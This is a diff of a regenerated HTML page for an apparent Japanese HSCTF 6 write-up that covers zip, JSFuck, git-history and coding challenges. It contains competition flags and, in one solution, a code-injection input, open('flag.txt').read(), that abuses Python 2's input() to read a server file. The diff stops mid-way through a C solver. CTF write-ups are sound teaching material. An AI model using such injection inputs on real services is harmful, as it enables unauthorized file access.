@@ -23,7 +23,7 @@
 <meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
 
 
-<meta name="generator" content="Hugo 0.55.6 with even 4.0.0" />
+<meta name="generator" content="Hugo 0.60.1 with theme even" />
 
 
 <link rel="canonical" href="https://captureamerica.github.io/writeups/post/hsctf_2019/" />
@@ -42,21 +42,17 @@
 <meta property="og:description" content="やり始めてから気づいたんですけど、HSってHigh Schoolerの略で、高校生用のCTFみたいですね。 Rulesを見たら、「アメリカの高校" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://captureamerica.github.io/writeups/post/hsctf_2019/" />
-<meta property="article:published_time" content="2019-06-08T00:00:00&#43;08:00"/>
-<meta property="article:modified_time" content="2019-06-08T11:20:00&#43;08:00"/>
-
+<meta property="article:published_time" content="2019-06-08T00:00:00+08:00" />
+<meta property="article:modified_time" content="2019-06-08T11:20:00+08:00" />
 <meta itemprop="name" content="HSCTF 6 Writeup">
 <meta itemprop="description" content="やり始めてから気づいたんですけど、HSってHigh Schoolerの略で、高校生用のCTFみたいですね。 Rulesを見たら、「アメリカの高校">
-
-
 <meta itemprop="datePublished" content="2019-06-08T00:00:00&#43;08:00" />
 <meta itemprop="dateModified" content="2019-06-08T11:20:00&#43;08:00" />
-<meta itemprop="wordCount" content="5278">
+<meta itemprop="wordCount" content="4985">
 
 
 
-<meta itemprop="keywords" content="CTF," />
-<meta name="twitter:card" content="summary"/>
+<meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="HSCTF 6 Writeup"/>
 <meta name="twitter:description" content="やり始めてから気づいたんですけど、HSってHigh Schoolerの略で、高校生用のCTFみたいですね。 Rulesを見たら、「アメリカの高校"/>
 
@@ -140,201 +136,162 @@
   <h2 class="post-toc-title">Contents</h2>
   <div class="post-toc-content always-active">
     <nav id="TableOfContents">
-<ul>
-<li><a href="#locked-up-miscellaneous">Locked Up (Miscellaneous)</a>
-<ul>
-<li><a href="#challenge">Challenge</a></li>
-<li><a href="#solution">Solution</a></li>
-</ul></li>
-<li><a href="#verbose-miscellaneous">Verbose (Miscellaneous)</a>
-<ul>
-<li><a href="#solution-1">Solution</a></li>
-</ul></li>
-<li><a href="#admin-pass-miscellaneous">Admin Pass (Miscellaneous)</a>
-<ul>
-<li><a href="#solution-2">Solution</a></li>
-</ul></li>
-<li><a href="#a-simple-conversation-miscellaneous">A Simple Conversation (Miscellaneous)</a>
-<ul>
-<li><a href="#solution-3">Solution</a></li>
-</ul></li>
-<li><a href="#broken-gps-miscellaneous">Broken GPS (Miscellaneous)</a>
-<ul>
-<li><a href="#solution-4">Solution</a></li>
-</ul></li>
-<li><a href="#broken-repl-miscellaneous">Broken REPL (Miscellaneous)</a>
-<ul>
-<li><a href="#not-solved">(Not solved)</a></li>
-</ul></li>
-<li><a href="#english-sucks-miscellaneous">English Sucks (Miscellaneous)</a>
-<ul>
-<li><a href="#not-solved-1">(Not solved)</a></li>
-</ul></li>
-<li><a href="#reverse-search-algorithm-cryptography">Reverse Search Algorithm (Cryptography)</a>
-<ul>
-<li><a href="#solution-5">Solution</a></li>
-</ul></li>
-<li><a href="#a-byte-reversal">A Byte (Reversal)</a>
-<ul>
-<li><a href="#solution-6">Solution</a></li>
-</ul></li>
-<li><a href="#return-to-sender-binary-exploitation">Return to Sender (Binary Exploitation)</a>
-<ul>
-<li><a href="#solution-7">Solution</a></li>
-</ul></li>
-<li><a href="#combo-chain-lite-binary-exploitation">Combo Chain Lite (Binary Exploitation)</a>
-<ul>
-<li><a href="#solution-8">Solution</a></li>
-</ul></li>
-<li><a href="#chicken-crossing-forensics">Chicken Crossing (Forensics)</a>
-<ul>
-<li><a href="#solution-9">Solution</a></li>
-</ul></li>
-<li><a href="#cool-image-forensics">Cool Image (Forensics)</a>
-<ul>
-<li><a href="#solution-10">Solution</a></li>
-</ul></li>
-<li><a href="#cool-image-2-forensics">Cool Image 2 (Forensics)</a>
-<ul>
-<li><a href="#solution-11">Solution</a></li>
-</ul></li>
-<li><a href="#slap-forensics">Slap (Forensics)</a>
-<ul>
-<li><a href="#solution-12">Solution</a></li>
-</ul></li>
-<li><a href="#fish-forensics">Fish (Forensics)</a>
-<ul>
-<li><a href="#solution-13">Solution</a></li>
-</ul></li>
-<li><a href="#inspect-me-web">Inspect Me (Web)</a>
-<ul>
-<li><a href="#solution-14">Solution</a></li>
-</ul></li>
-<li><a href="#agent-keith-web">Agent Keith (Web)</a>
-<ul>
-<li><a href="#solution-15">Solution</a></li>
-</ul></li>
-<li><a href="#s-q-l-web">S-Q-L (Web)</a>
-<ul>
-<li><a href="#solution-16">Solution</a></li>
-</ul></li>
-<li><a href="#the-quest-web">The Quest (Web)</a>
-<ul>
-<li><a href="#solution-17">Solution</a></li>
-</ul></li>
-<li><a href="#keith-logger-web">Keith Logger (Web)</a>
-<ul>
-<li><a href="#solution-18">Solution</a></li>
-</ul></li>
-<li><a href="#accessible-rich-internet-applications-web">Accessible Rich Internet Applications (Web)</a>
-<ul>
-<li><a href="#solution-19">Solution</a></li>
-</ul></li>
-</ul>
+  <ul>
+    <li><a href="#challenge">Challenge</a></li>
+    <li><a href="#solution">Solution</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#solution1">Solution</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#solution2">Solution</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#solution3">Solution</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#solution4">Solution</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#not-solved">(Not solved)</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#not-solved1">(Not solved)</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#solution5">Solution</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#solution6">Solution</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#solution7">Solution</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#solution8">Solution</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#solution9">Solution</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#solution10">Solution</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#solution11">Solution</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#solution12">Solution</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#solution13">Solution</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#solution14">Solution</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#solution15">Solution</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#solution16">Solution</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#solution17">Solution</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#solution18">Solution</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#solution19">Solution</a></li>
+  </ul>
 </nav>
   </div>
 </div>
     <div class="post-content">
-      
-
-<p>やり始めてから気づいたんですけど、HSってHigh Schoolerの略で、高校生用のCTFみたいですね。
-<br /><br />
+      <p>やり始めてから気づいたんですけど、HSってHigh Schoolerの略で、高校生用のCTFみたいですね。
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
 Rulesを見たら、「アメリカの高校生じゃないと賞はもらえないよ」とは書いてありましたが、「大人が参加しちゃダメ」とは書いてなかったのでやってみました。
-<br /><br />
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
 開催が平日だし、問題数多いし、何気に難易度高いし、解けなかったチャレンジも多かったけど、楽しかったです。
-<br /><br />
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
 チームのCaptainなので、Captain Capture Americaです（笑
-<br />
-<img src="https://captureamerica.github.io/writeups/img/captain.png" alt="captain.png"></p>
-
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted --></p>
 <p>ちなみに、参加チームは全体で1000チームくらいでした。</p>
-
-<p><br /><br />
-<br /><br /></p>
-
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <h1 id="locked-up-miscellaneous">Locked Up (Miscellaneous)</h1>
-
-<hr />
-
+<hr>
 <h2 id="challenge">Challenge</h2>
-
 <blockquote>
 <p>My friend gave me a zip file with the flag in it, but the zip file is encrypted. Can you help me open the zip file?</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>locked.zip</li>
 </ul>
-
 <h2 id="solution">Solution</h2>
-
-<pre>
-$ zipinfo locked.zip | grep hsctf
--rwxrwxrwx  3.0 unx        0 BX stor 19-Jun-03 13:22 hsctf{w0w_z1ps_ar3nt_th@t_secUr3}
-</pre>
-
-<p><br /><br />
-<br /><br /></p>
-
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <h1 id="verbose-miscellaneous">Verbose (Miscellaneous)</h1>
-
-<hr />
-
+<hr>
 <blockquote>
-<p>My friend sent me this file, but I don&rsquo;t understand what I can do with these 6 different characters&hellip;</p>
+<p>My friend sent me this file, but I don't understand what I can do with these 6 different characters&hellip;</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>verbose.txt</li>
 </ul>
-
-<h2 id="solution-1">Solution</h2>
-
-<p><a href="http://codertab.com/JsUnFuck">http://codertab.com/JsUnFuck</a></p>
-
-<p>サイズが大きいので、結果が出るまで数分かかりました。<br />
-var flag = &ldquo;hsctf{esoteric_javascript_is_very_verbose}&ldquo;; window.location = &ldquo;<a href="https://hsctf.com&quot;">https://hsctf.com&quot;</a>;</p>
-
-<p><br /><br />
-<br /><br /></p>
-
+<h2 id="solution1">Solution</h2>
+<p><a href="http://codertab.com/JsUnFuck"><a href="http://codertab.com/JsUnFuck">http://codertab.com/JsUnFuck</a></a></p>
+<p>サイズが大きいので、結果が出るまで数分かかりました。<!-- raw HTML omitted -->
+var flag = &ldquo;hsctf{esoteric_javascript_is_very_verbose}&quot;; window.location = &ldquo;<a href="https://hsctf.com">https://hsctf.com</a>&rdquo;;</p>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <h1 id="admin-pass-miscellaneous">Admin Pass (Miscellaneous)</h1>
-
-<hr />
-
+<hr>
 <blockquote>
-<p>Hey guys, found a super cool website at <a href="http://misc.hsctf.com:8001!">http://misc.hsctf.com:8001!</a></p>
+<p>Hey guys, found a super cool website at <a href="http://misc.hsctf.com:8001">http://misc.hsctf.com:8001</a>!</p>
 </blockquote>
-
-<h2 id="solution-2">Solution</h2>
-
+<h2 id="solution2">Solution</h2>
 <p>gitlab.comへのリンクがあって、そこに飛んでファイルの過去の履歴とか見ているとフラグが見つかります。</p>
-
-<p><br /><br />
-<br /><br /></p>
-
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <h1 id="a-simple-conversation-miscellaneous">A Simple Conversation (Miscellaneous)</h1>
-
-<hr />
-
+<hr>
 <blockquote>
 <p>Someone on the internet wants to talk to you. Can you find out what they want?</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>talk.py</li>
 </ul>
-
 <p>以下、抜粋。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -351,72 +308,51 @@ var flag = &ldquo;hsctf{esoteric_javascript_is_very_verbose}&ldquo;; window.loca
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="k">print</span><span class="p">(</span><span class="s2">&#34;What&#39;s your age?&#34;</span><span class="p">)</span>
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="k">print</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">What</span><span class="s2">&#39;</span><span class="s2">s your age?</span><span class="s2">&#34;</span><span class="p">)</span>
 
-<span class="n">age</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
-
-<span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;Wow!&#34;</span><span class="p">)</span>
+<span class="n">age</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">&gt; </span><span class="s2">&#34;</span><span class="p">)</span>
 
 <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;Sometimes I wish I was </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">age</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">Wow!</span><span class="s2">&#34;</span><span class="p">)</span>
 
 <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;Well, it was nice meeting you, </span><span class="si">%s</span><span class="s2">-year-old.&#34;</span> <span class="o">%</span> <span class="n">age</span><span class="p">)</span></code></pre></td></tr></table>
+<span class="k">print</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">Sometimes I wish I was </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">age</span><span class="p">)</span>
+
+<span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">Well, it was nice meeting you, </span><span class="si">%s</span><span class="s2">-year-old.</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">age</span><span class="p">)</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<h2 id="solution-3">Solution</h2>
-
-<p><code>open('flag.txt').read()</code>
-<pre>
-$ nc misc.hsctf.com 9001
-Hello!
-Hey, can you help me out real quick.
-I need to know your age.
-What&rsquo;s your age?
-&gt; open(&lsquo;flag.txt&rsquo;).read()
-Wow!
-Sometimes I wish I was hsctf{plz_u5e_pyth0n_3}</p>
-
-<p>Well, it was nice meeting you, hsctf{plz_u5e_pyth0n_3}
--year-old.
-Goodbye!
-</pre></p>
-
-<p><br /><br />
-<br /><br /></p>
-
+</div><h2 id="solution3">Solution</h2>
+<p><code>open('flag.txt').read()</code></p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <h1 id="broken-gps-miscellaneous">Broken GPS (Miscellaneous)</h1>
-
-<hr />
-
+<hr>
 <blockquote>
 <p>Ella is following a broken GPS. The GPS tells her to move in the opposite direction than the one she should be travelling in to get to her destination, and she follows her GPS exactly. For instance, every time she is supposed to move west, the GPS tells her to move east and she does so. Eventually she ends up in a totally different place than her intended location. What is the shortest distance between these two points? Assume that she moves one unit every time a direction is specified. For instance, if the GPS tells her to move &ldquo;north,&rdquo; she moves one unit north. If the GPS tells her to move &ldquo;northwest,&rdquo; then she moves one unit north and one unit west.
-<br /><br />
-Input Format:<br />
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
+Input Format:<!-- raw HTML omitted -->
 You will receive a text file with N directions provided to her by the GPS (the ones that she will be following) (1&lt;=N&lt;=1000). The first line in the file will be N, and each consequent line will contain a single direction: “north,” “south,” “east,” “west,” “northwest,” “northeast,” “southwest,” or “southeast.”
-<br /><br />
-Output Format:<br />
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
+Output Format:<!-- raw HTML omitted -->
 Round your answer to the nearest whole number and then divide by 26. Discard the quotient (mod 26). Each possible remainder corresponds to a letter in the alphabet. (0=a, 1=b… 25=z).
-<br /><br />
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
 Find the letter for each test case and string them together. The result is the flag. (For instance, a, b, c becomes “abc”). Remember to use the flag format and keep all letters lowercase!</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>input.zip</li>
 </ul>
-
-<h2 id="solution-4">Solution</h2>
-
+<h2 id="solution4">Solution</h2>
 <p>問題文がとにかく長いけど、言われるがままにコーディングするだけの問題。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -516,129 +452,123 @@ Find the letter for each test case and string them together. The result is the f
 </span><span class="lnt">98
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;math.h&gt;</span><span class="cp">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#</span><span class="cp">include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp"></span><span class="cp">#</span><span class="cp">include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp"></span><span class="cp">#</span><span class="cp">include</span> <span class="cpf">&lt;math.h&gt;</span><span class="cp">
 </span><span class="cp"></span>
-<span class="cp">#define NUM_OF_FILES    12
-</span><span class="cp">#define MAX_FNAME_LEN   10
-</span><span class="cp">#define LINE_LEN        12
-</span><span class="cp"></span><span class="kt">char</span> <span class="n">alphabet</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;abcdefghijklmnopqrstuvwxyz&#34;</span><span class="p">;</span>
+<span class="cp">#</span><span class="cp">define NUM_OF_FILES    12</span><span class="cp">
+</span><span class="cp"></span><span class="cp">#</span><span class="cp">define MAX_FNAME_LEN   10</span><span class="cp">
+</span><span class="cp"></span><span class="cp">#</span><span class="cp">define LINE_LEN        12</span><span class="cp">
+</span><span class="cp"></span><span class="kt">char</span> <span class="n">alphabet</span><span class="p">[</span><span class="p">]</span> <span class="o">=</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">abcdefghijklmnopqrstuvwxyz</span><span class="s">&#34;</span><span class="p">;</span>
 
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="o">*</span><span class="n">argv</span><span class="p">)</span>
 <span class="p">{</span>
 	<span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
-	<span class="kt">char</span> <span class="n">fname</span><span class="p">[</span><span class="n">MAX_FNAME_LEN</span><span class="p">];</span>
-	<span class="kt">char</span> <span class="n">tmp_buff</span><span class="p">[</span><span class="n">LINE_LEN</span><span class="p">];</span>
+	<span class="kt">char</span> <span class="n">fname</span><span class="p">[</span><span class="n">MAX_FNAME_LEN</span><span class="p">]</span><span class="p">;</span>
+	<span class="kt">char</span> <span class="n">tmp_buff</span><span class="p">[</span><span class="n">LINE_LEN</span><span class="p">]</span><span class="p">;</span>
 	<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
 	<span class="kt">int</span> <span class="n">x1</span><span class="p">,</span> <span class="n">x2</span><span class="p">,</span> <span class="n">y1</span><span class="p">,</span> <span class="n">y2</span><span class="p">;</span>
 	<span class="kt">char</span> <span class="o">*</span><span class="n">find</span><span class="p">;</span>
 	<span class="kt">int</span> <span class="n">ans</span><span class="p">;</span>
 
-	<span class="n">printf</span><span class="p">(</span> <span class="s">&#34;hsctf{&#34;</span> <span class="p">);</span>
-	<span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span> <span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">NUM_OF_FILES</span> <span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
-		<span class="n">memset</span><span class="p">(</span> <span class="n">fname</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">MAX_FNAME_LEN</span> <span class="p">);</span>
-		<span class="n">sprintf</span><span class="p">(</span> <span class="n">fname</span><span class="p">,</span> <span class="s">&#34;%d.txt&#34;</span><span class="p">,</span> <span class="n">i</span> <span class="p">);</span>
-		<span class="k">if</span> <span class="p">(</span> <span class="p">(</span> <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span> <span class="n">fname</span><span class="p">,</span> <span class="s">&#34;rb&#34;</span> <span class="p">)</span> <span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">{</span>
+	<span class="n">printf</span><span class="p">(</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">hsctf{</span><span class="s">&#34;</span> <span class="p">)</span><span class="p">;</span>
+	<span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span> <span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span><span class="o">=</span> <span class="n">NUM_OF_FILES</span> <span class="p">;</span> <span class="n">i</span><span class="o">+</span><span class="o">+</span> <span class="p">)</span> <span class="p">{</span>
+		<span class="n">memset</span><span class="p">(</span> <span class="n">fname</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">MAX_FNAME_LEN</span> <span class="p">)</span><span class="p">;</span>
+		<span class="n">sprintf</span><span class="p">(</span> <span class="n">fname</span><span class="p">,</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">%d.txt</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">i</span> <span class="p">)</span><span class="p">;</span>
+		<span class="k">if</span> <span class="p">(</span> <span class="p">(</span> <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span> <span class="n">fname</span><span class="p">,</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">rb</span><span class="s">&#34;</span> <span class="p">)</span> <span class="p">)</span> <span class="o">=</span><span class="o">=</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">{</span>
 			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
 		<span class="p">}</span>
 		<span class="n">x1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 		<span class="n">x2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 		<span class="n">y1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 		<span class="n">y2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-		<span class="n">fgets</span><span class="p">(</span> <span class="n">tmp_buff</span><span class="p">,</span> <span class="n">LINE_LEN</span><span class="p">,</span> <span class="n">fp</span> <span class="p">);</span> <span class="c1">// skip line number
+		<span class="n">fgets</span><span class="p">(</span> <span class="n">tmp_buff</span><span class="p">,</span> <span class="n">LINE_LEN</span><span class="p">,</span> <span class="n">fp</span> <span class="p">)</span><span class="p">;</span> <span class="c1">// skip line number
 </span><span class="c1"></span>		
-		<span class="k">while</span><span class="p">(</span> <span class="n">fgets</span><span class="p">(</span> <span class="n">tmp_buff</span><span class="p">,</span> <span class="n">LINE_LEN</span><span class="p">,</span> <span class="n">fp</span> <span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">{</span>
-			<span class="n">find</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span> <span class="n">tmp_buff</span><span class="p">,</span> <span class="s">&#34;northeast&#34;</span> <span class="p">);</span>
-			<span class="k">if</span> <span class="p">(</span> <span class="n">find</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">{</span>
-				<span class="n">x1</span><span class="o">++</span><span class="p">;</span>
-				<span class="n">y1</span><span class="o">++</span><span class="p">;</span>
-				<span class="n">x2</span><span class="o">--</span><span class="p">;</span>
-				<span class="n">y2</span><span class="o">--</span><span class="p">;</span>
+		<span class="k">while</span><span class="p">(</span> <span class="n">fgets</span><span class="p">(</span> <span class="n">tmp_buff</span><span class="p">,</span> <span class="n">LINE_LEN</span><span class="p">,</span> <span class="n">fp</span> <span class="p">)</span> <span class="o">!</span><span class="o">=</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">{</span>
+			<span class="n">find</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span> <span class="n">tmp_buff</span><span class="p">,</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">northeast</span><span class="s">&#34;</span> <span class="p">)</span><span class="p">;</span>
+			<span class="k">if</span> <span class="p">(</span> <span class="n">find</span> <span class="o">!</span><span class="o">=</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">{</span>
+				<span class="n">x1</span><span class="o">+</span><span class="o">+</span><span class="p">;</span>
+				<span class="n">y1</span><span class="o">+</span><span class="o">+</span><span class="p">;</span>
+				<span class="n">x2</span><span class="o">-</span><span class="o">-</span><span class="p">;</span>
+				<span class="n">y2</span><span class="o">-</span><span class="o">-</span><span class="p">;</span>
 				<span class="k">continue</span><span class="p">;</span>
 			<span class="p">}</span>
-			<span class="n">find</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span> <span class="n">tmp_buff</span><span class="p">,</span> <span class="s">&#34;southeast&#34;</span> <span class="p">);</span>
-			<span class="k">if</span> <span class="p">(</span> <span class="n">find</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">{</span>
-				<span class="n">x1</span><span class="o">++</span><span class="p">;</span>
-				<span class="n">y1</span><span class="o">--</span><span class="p">;</span>
-				<span class="n">x2</span><span class="o">--</span><span class="p">;</span>
-				<span class="n">y2</span><span class="o">++</span><span class="p">;</span>
+			<span class="n">find</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span> <span class="n">tmp_buff</span><span class="p">,</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">southeast</span><span class="s">&#34;</span> <span class="p">)</span><span class="p">;</span>
+			<span class="k">if</span> <span class="p">(</span> <span class="n">find</span> <span class="o">!</span><span class="o">=</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">{</span>
+				<span class="n">x1</span><span class="o">+</span><span class="o">+</span><span class="p">;</span>
+				<span class="n">y1</span><span class="o">-</span><span class="o">-</span><span class="p">;</span>
+				<span class="n">x2</span><span class="o">-</span><span class="o">-</span><span class="p">;</span>
+				<span class="n">y2</span><span class="o">+</span><span class="o">+</span><span class="p">;</span>
 				<span class="k">continue</span><span class="p">;</span>
 			<span class="p">}</span>
-			<span class="n">find</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span> <span class="n">tmp_buff</span><span class="p">,</span> <span class="s">&#34;northwest&#34;</span> <span class="p">);</span>
-			<span class="k">if</span> <span class="p">(</span> <span class="n">find</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">{</span>
-				<span class="n">x1</span><span class="o">--</span><span class="p">;</span>
-				<span class="n">y1</span><span class="o">++</span><span class="p">;</span>
-				<span class="n">x2</span><span class="o">++</span><span class="p">;</span>
-				<span class="n">y2</span><span class="o">--</span><span class="p">;</span>
+			<span class="n">find</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span> <span class="n">tmp_buff</span><span class="p">,</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">northwest</span><span class="s">&#34;</span> <span class="p">)</span><span class="p">;</span>
+			<span class="k">if</span> <span class="p">(</span> <span class="n">find</span> <span class="o">!</span><span class="o">=</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">{</span>
+				<span class="n">x1</span><span class="o">-</span><span class="o">-</span><span class="p">;</span>
+				<span class="n">y1</span><span class="o">+</span><span class="o">+</span><span class="p">;</span>
+				<span class="n">x2</span><span class="o">+</span><span class="o">+</span><span class="p">;</span>
+				<span class="n">y2</span><span class="o">-</span><span class="o">-</span><span class="p">;</span>
 				<span class="k">continue</span><span class="p">;</span>
 			<span class="p">}</span>
-			<span class="n">find</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span> <span class="n">tmp_buff</span><span class="p">,</span> <span class="s">&#34;southwest&#34;</span> <span class="p">);</span>
-			<span class="k">if</span> <span class="p">(</span> <span class="n">find</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">{</span>
-				<span class="n">x1</span><span class="o">--</span><span class="p">;</span>
-				<span class="n">y1</span><span class="o">--</span><span class="p">;</span>
-				<span class="n">x2</span><span class="o">++</span><span class="p">;</span>
-				<span class="n">y2</span><span class="o">++</span><span class="p">;</span>
+			<span class="n">find</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span> <span class="n">tmp_buff</span><span class="p">,</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">southwest</span><span class="s">&#34;</span> <span class="p">)</span><span class="p">;</span>
+			<span class="k">if</span> <span class="p">(</span> <span class="n">find</span> <span class="o">!</span><span class="o">=</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">{</span>
+				<span class="n">x1</span><span class="o">-</span><span class="o">-</span><span class="p">;</span>
+				<span class="n">y1</span><span class="o">-</span><span class="o">-</span><span class="p">;</span>
